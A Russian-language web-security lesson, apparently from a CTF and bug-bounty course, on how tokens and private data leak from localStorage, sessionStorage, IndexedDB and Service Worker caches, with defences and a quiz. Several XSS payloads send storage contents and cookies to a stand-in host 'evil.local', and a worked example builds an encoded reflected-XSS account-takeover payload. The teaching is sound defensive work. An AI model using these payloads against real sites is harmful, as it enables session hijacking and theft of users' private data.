---
id: web-webstorage
title: "Web Storage, IndexedDB и клиентские утечки"
category: web
parent: web-cookies-sessions
difficulty: easy
order: 1
tags: [webstorage, localstorage, sessionstorage, indexeddb, xss, tokens]
prerequisites: [web-cookies-sessions, web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 40
summary: "Где SPA хранят токены и сессии, чем это опасно при XSS и как читать/анализировать клиентское хранилище."
---

Web Storage (`localStorage`, `sessionStorage`) и IndexedDB — это клиентские хранилища, которые браузер даёт JavaScript. В отличие от cookie, они не отправляются автоматически на сервер, поэтому их часто считают «безопасными». На практике это огромная поверхность для утечек: токены, персональные данные, кэш API-ответов и черновики живут в них в открытом виде, доступны любому скрипту на том же origin и сохраняются на диске. Если на сайте есть XSS, содержимое Web Storage утекает мгновенно; если нет — остаются риски от общих устройств, сторонних скриптов и неверного проектирования.

## Чем Web Storage отличается от cookie

Главное различие — модель доступа. Cookie отправляются с каждым HTTP-запросом (если не `HttpOnly`), и потому они — мишень для CSRF и перехвата по сети. Web Storage, напротив, никогда не уходит на сервер автоматически: чтобы отправить данные, нужен явный `fetch`. Из этого следуют два важных вывода. Во-первых, `localStorage` **не защищён от XSS вообще**: любой внедрённый скрипт читает его полностью через `localStorage.getItem`. Во-вторых, Web Storage **не имеет флага `HttpOnly`** — такого механизма для него не существует. Поэтому хранение долгоживущих токенов сессии в `localStorage` — распространённая и опасная практика: одна XSS-уязвимость превращается в полный захват аккаунта, причём надолго.

Дополнительно: `localStorage` сохраняется между сессиями и вкладками (общий для origin), а `sessionStorage` живёт до закрытия вкладки и изолирован по вкладкам. IndexedDB — полноценная асинхронная БД в браузере, тоже привязана к origin и тоже читается любым скриптом. Все три не имеют встроенного шифрования и не защищены от физического доступа к устройству.

## Что искать в Web Storage

При аудите первым делом открываете DevTools → Application → Storage и просматриваете `localStorage`, `sessionStorage`, IndexedDB, а также Cache Storage (Service Worker). Ищите: токены (JWT, access/refresh), идентификаторы сессий, персональные данные (email, телефон, адрес), платёжную информацию, внутренние идентификаторы и роли, кэш приватных API-ответов, черновики и «временные» секреты (API-ключи сторонних сервисов).

```bash
# из консоли браузера
Object.entries(localStorage).forEach(([k,v]) => console.log(k, '=', v.slice(0,200)));
Object.entries(sessionStorage).forEach(([k,v]) => console.log(k, '=', v.slice(0,200)));
# IndexedDB
indexedDB.databases().then(dbs => dbs.forEach(d => console.log(d.name)));
# Cache Storage (SW)
caches.keys().then(ks => ks.forEach(k => caches.open(k).then(c => c.keys().then(r => console.log(k, r)))));
```

## Атака 1: кража через XSS

Любая XSS превращается в кражу всего содержимого хранилищ. Полезная нагрузка читает все ключи и отправляет их на сервер атакующего.

```html
<script>
fetch('https://evil.local/collect', {
  method:'POST',
  body: JSON.stringify({ls:{...localStorage}, ss:{...sessionStorage}, cookie:document.cookie})
});
</script>
```

Особенно опасно, когда в `localStorage` лежит refresh-token: даже после смены пароля атакующий может обменивать его на новые access-токены. Проверяя XSS, всегда смотрите, что именно доступно в хранилищах — это определяет серьёзность находки.

## Атака 2: сторонние скрипты

Сторонние скрипты (аналитика, реклама, виджеты, CDN) исполняются на вашем origin и имеют **полный доступ** к Web Storage. Компрометация стороннего скрипта (supply-chain attack) или просто недобросовестный провайдер — это чтение всех ваших данных. Проверяйте, какие домены подключены и что они могут читать.

```bash
# список сторонних скриптов
curl -s https://t/ | grep -oE '<script[^>]+src="https?://[^"]+"' | sort -u
```

## Атака 3: общие устройства и persistence

`localStorage` не очищается при закрытии браузера и часто не очищается при выходе из аккаунта (если разработчик забыл). На общем компьютере следующий пользователь может открыть DevTools и прочитать токены и данные. Проверяйте, очищаются ли хранилища при logout.

```bash
# после logout проверяем в консоли
localStorage.clear(); // если разработчик не делает это сам — данные остаются
```

## Атака 4: DOM-based утечки через postMessage/opener

Если приложение передаёт содержимое хранилища через `postMessage` без проверки origin (или в `window.name`), данные утекают в другое окно. Это связка Web Storage с межоконными атаками: хранилище — источник, postMessage — канал.

## Разобранный пример: полный захват через XSS + localStorage

```bash
# 1. видим в DevTools, что access и refresh токены лежат в localStorage
# localStorage:
#   access_token = eyJhbGciOi...
#   refresh_token = 8f3a...

# 2. находим reflected XSS
$ curl -s 'https://t/search?q=<script>alert(1)</script>' | grep -o '<script>alert(1)</script>'

# 3. строим payload для кражи хранилища
PAYLOAD='<script>fetch("https://evil.local/c?d="+btoa(JSON.stringify(localStorage)))</script>'
$ curl -s "https://t/search?q=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")"
# 4. на evil.local получаем access+refresh -> вход без пароля, устойчивый доступ
```

Артефакт — токены жертвы на вашем сервере и успешный вход с ними.

## Разобранный пример: приватные данные в IndexedDB

```bash
# 1. приложение кэширует сообщения в IndexedDB
# 2. XSS читает базу
<script>
const req = indexedDB.open('app');
req.onsuccess = () => {
  const tx = req.result.transaction('messages').objectStore('messages').getAll();
  tx.onsuccess = () => fetch('https://evil.local/c', {method:'POST', body: JSON.stringify(tx.result)});
};
</script>
```

## Защита: как правильно

Правильная практика — хранить чувствительные токены в `HttpOnly; Secure; SameSite` cookie, которые недоступны JavaScript, а не в `localStorage`. Для CSRF при этом используют CSRF-токены или `SameSite`. Клиентские данные, которые не являются секретами, можно держать в Web Storage, но не стоит кэшировать приватные API-ответы без шифрования. При logout обязательно очищайте все хранилища (`localStorage.clear()`, `sessionStorage.clear()`, удаление IndexedDB и Cache Storage). Минимизируйте сторонние скрипты и используйте Subresource Integrity для них. И главное — закрывайте XSS, потому что именно она превращает любое клиентское хранилище в канал утечки.

## Крайние случаи и подводные камни

- **`localStorage` общий для всех вкладок** одного origin — одна XSS в одной вкладке компрометирует все.
- **IndexedDB асинхронна** — утечка требует больше кода, но полностью возможна.
- **Cache Storage** Service Worker может содержать приватные ответы и переживать logout.
- **`sessionStorage` не «безопаснее»** — он тоже читается любым скриптом, просто живёт меньше.
- **Расширения браузера** могут читать хранилища — ещё один вектор.
- **Логи и бэкапы** иногда содержат дампы хранилищ.

## Что делать дальше / решение

1. **Просмотрите хранилища** в DevTools: `localStorage`, `sessionStorage`, IndexedDB, Cache Storage.
2. **Классифицируйте данные** — есть ли токены/персональные/платёжные.
3. **Проверьте XSS** — если есть, кража хранилища мгновенна.
4. **Проверьте logout** — очищаются ли хранилища.
5. **Проверьте сторонние скрипты** — что они могут читать.
6. **Соберите PoC** — payload, отправляющий содержимое хранилища на ваш сервер.
7. **Тупик** — переходите к cookie/сессии и JWT-атакам.

## Справочная таблица

| Хранилище | Живёт | Доступ | Риск |
|-----------|-------|--------|------|
| cookie (HttpOnly) | по Max-Age | не видно JS | защищено от XSS |
| cookie (без HttpOnly) | по Max-Age | видно JS | XSS крадёт |
| localStorage | до очистки | JS любого скрипта | XSS/общее устройство |
| sessionStorage | до закрытия вкладки | JS вкладки | XSS |
| IndexedDB | до очистки | JS | XSS, кэш приватных данных |
| Cache Storage (SW) | до очистки | JS/SW | приватные ответы |

## Глубже: почему localStorage стал стандартом и почему это плохо

Исторически `localStorage` стал популярен как удобное место для JWT в SPA: он прост, синхронен, не имеет проблем с CORS и не отправляется автоматически, что снижает риск CSRF. Именно последний аргумент («не уходит с запросами») и подкупил разработчиков: раз токен не отправляется автоматически, значит, CSRF невозможен, а XSS… «ну, XSS всё равно всё ломает». Это опасное упрощение. Проблема в том, что cookie можно защитить флагом `HttpOnly`, а `localStorage` — нельзя. То есть при XSS cookie (с HttpOnly) остаются недоступны, а токен в `localStorage` утекает. Разница принципиальна: `HttpOnly` превращает XSS из «полного захвата» в «действия от имени пользователя, пока он на странице», а `localStorage` — в «украденный токен, действующий вечно».

Корректная архитектура: access-token короткоживущий и в памяти (переменная JS), refresh-token — в `HttpOnly; Secure; SameSite=Strict` cookie, привязанный к устройству и ротируемый. Тогда XSS даёт максимум временный доступ, а не бессрочный. Многие SPA, однако, кладут оба токена в `localStorage`, что и делает их хрупкими.

## Глубже: утечки через кэш и Service Worker

Service Worker и Cache Storage добавляют ещё один слой, о котором часто забывают. SW перехватывает сетевые запросы и может кэшировать ответы, в том числе приватные: список сообщений, данные профиля, ответы API. Этот кэш хранится в браузере, привязан к origin и читается любым скриптом (и самим SW). Если приложение не очищает Cache Storage при logout, приватные данные остаются доступны следующему пользователю устройства. Кроме того, SW может быть скомпрометирован через XSS: внедрённый скрипт регистрирует свой SW, который затем перехватывает все запросы — это уже полноценный перехват трафика на origin.

```bash
# посмотреть кэш Service Worker из консоли
caches.keys().then(ks => Promise.all(ks.map(k => caches.open(k).then(c => c.keys())))).then(console.log)
# найти регистрацию SW
curl -s https://t/ | grep -oE "navigator.serviceWorker.register\([^)]+\)"
```

## Итог и приоритизация

Наиболее критично хранение долгоживущих токенов (refresh-token, «вечный» JWT) в `localStorage` при наличии любой XSS — это полный захват аккаунта. Далее — кэширование приватных данных в IndexedDB/Cache Storage без очистки. Затем — отсутствие очистки хранилищ при logout (общее устройство). Сторонние скрипты — усилитель: они имеют доступ ко всему. При отчёте всегда указывайте конкретный артефакт: какие данные вы извлекли и что с ними можно сделать.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какое хранилище недоступно из JavaScript?"
  options:
    - "`localStorage`"
    - "`sessionStorage`"
    - "Cookie с флагом `HttpOnly`"
    - "`IndexedDB`"
  answer: 2
  explanation: "`HttpOnly` прячет cookie от JS; остальные доступны."
- question: "Чем опасен токен в `localStorage`?"
  options:
    - "Любая XSS читает его"
    - "Он ускоряет сайт"
    - "Он блокирует CORS"
    - "Он шифрует данные"
  answer: 0
  explanation: "Нет `HttpOnly` — JS на origin имеет полный доступ."
- question: "До какого момента живёт `sessionStorage`?"
  options:
    - "До закрытия вкладки"
    - "Вечно"
    - "До смены пароля"
    - "До перезагрузки сервера"
  answer: 0
  explanation: "`sessionStorage` привязан к вкладке/сессии."
- question: "Какая комбинация cookie безопаснее для сессии?"
  options:
    - "`HttpOnly; Secure; SameSite`"
    - "без флагов"
    - "только `Secure`"
    - "только `SameSite=None`"
  answer: 0
  explanation: "`HttpOnly`+`Secure`+`SameSite` закрывает и кражу JS, и часть CSRF."
- question: "Что часто хранится в IndexedDB у SPA?"
  options:
    - "Кэш данных и токены"
    - "Только картинки"
    - "Ничего"
    - "Сертификаты TLS"
  answer: 0
  explanation: "IndexedDB вместительна и хранит оффлайн-данные/токены."
```

## Где пригодится

- **CTF (Web):** задачи, где флаг/токен лежит в localStorage и крадётся через XSS.
- **Bug bounty:** хранение токенов в JS-доступном месте + XSS = кража сессии.
- **Пентест:** аудит SPA-хранилищ и жизненного цикла токенов.
- **Работа (AppSec/Dev):** выбор cookie `HttpOnly` для сессий, короткие access-токены.
